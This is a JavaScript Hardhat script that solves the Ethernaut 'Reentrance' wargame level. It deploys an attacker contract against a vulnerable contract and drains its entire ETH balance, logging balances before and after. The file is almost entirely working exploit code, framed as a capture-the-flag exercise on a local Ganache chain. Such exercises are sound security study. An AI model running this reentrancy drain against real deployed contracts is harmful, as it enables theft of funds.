/*
The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

Untrusted contracts can execute code where you least expect it.
Fallback methods
Throw/revert bubbling
Sometimes the best way to attack a contract is with another contract.
*/

const hre = require("hardhat");

async function main() {
  // Deployed on Ganache
  [player] = await ethers.getSigners();

  // Get an instance of the contract deployed by Ethernaut
  const ReentranceAddress = "0x34D64e3dA75c21677E722B400fE9CF94ee32223a"
  this.reentrance = await hre.ethers.getContractAt("Reentrance",ReentranceAddress);

  // Deploying the Attacker contract
  const AttackReentrance = await hre.ethers.getContractFactory("AttackReentrance");
  this.attackReentrance = await AttackReentrance.connect(player).deploy(this.reentrance.address);
  await this.attackReentrance.deployed();

  console.log(
    `
    Reentrance contract ETH Balance ${await hre.ethers.provider.getBalance(this.reentrance.address)} \n
    ReentranceAttack contract will attack the next contract: ${await this.attackReentrance.reentranceContract()} \n
    ReentranceAttack contract ETH Balance: ${await hre.ethers.provider.getBalance(this.attackReentrance.address)}
    `
  );

  console.log("\n\n Performing attack ... \n\n");

  const currentReentranceETHBalance = await hre.ethers.provider.getBalance(this.reentrance.address); // The returned value is already expressed in wei
  const attackAmount = currentReentranceETHBalance;

  console.log("currentReentranceETHBalance: ", hre.ethers.utils.formatEther(currentReentranceETHBalance));
  console.log("attackAmount: ", hre.ethers.utils.formatEther(attackAmount));

  // Draining the ETH balance of the Reentrance contract
  console.log("Draining the ETH balance of the Reentrance contract ...");

  const tx = await this.attackReentrance.connect(player).attack({ value: attackAmount });
  
  // Await for the tx to be mined
  console.log("Waiting while the Reentrance conctract is paying the price of not been audited! : )");
  let txResult = await tx.wait();

  console.log("===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n\n");

  console.log(
    `
    Reentrance contract ETH Balance ${await hre.ethers.provider.getBalance(this.reentrance.address)} \n
    ReentranceAttack contract ETH Balance: ${await hre.ethers.provider.getBalance(this.attackReentrance.address)}
    `
  );

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});